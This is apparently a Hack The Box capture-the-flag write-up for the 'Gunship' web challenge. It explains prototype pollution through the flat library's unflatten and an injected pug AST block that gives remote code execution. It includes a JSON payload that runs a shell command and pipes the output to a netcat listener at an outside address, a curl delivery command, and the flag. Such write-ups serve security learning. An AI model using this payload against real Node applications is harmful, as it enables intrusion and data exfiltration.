> A city of lights, with retrofuturistic 80s peoples, and coffee, and drinks from another world...
> all the wooing in the world to make you feel more lonely...
> this ride ends here, with a tribute page of the British synthwave band called Gunship. :musical_note:

> Authors: **[makelaris][author-profile-1] & [makelarisjr][author-profile-2]**

## Polluting Gunship

Well the website has a single button: it sends a serialized json object
to `/api/submit`:

```javascript
fetch('/api/submit', {
    method: 'POST',
    body: JSON.stringify({
        'artist.name': document.querySelector('input[type=text]').value
    }),
    headers: {'Content-Type': 'application/json'}
})
```

The server then processes the json object with the `flat` library:

```javascript
const { artist } = unflatten(req.body);
```

With this, we can pollute the Object properties! Hacktrick has a [great article][hacktricks]
about prototype pollution.

In this case, we want to modify the `block` attribute which is evaluated when
`pug` calls `compile`:

```javascript
pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
```

So we capture the POST request to `/api/submit` in BurpSuite and add:

```json
{
    "artist.name":"Westaway",
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync(`ls -lah |nc -w 3 172.17.0.1 9876`)"}
}
```

After moving the payload to `waste-away.json`, the query becomes a clean curl command:

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: localhost:1337' \
    -H $'Content-Type: application/json' \
    -H $'Accept-Encoding: gzip, deflate' \
    --data-binary $'@waste-away.json' \
    $'http://localhost:1337/api/submit'
```

The file can be uploaded with Netcat too, through Ngrok for example.

> HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}

[author-profile-1]: https://app.hackthebox.eu/users/107
[author-profile-1]: https://app.hackthebox.eu/users/95
[hacktricks]: https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution

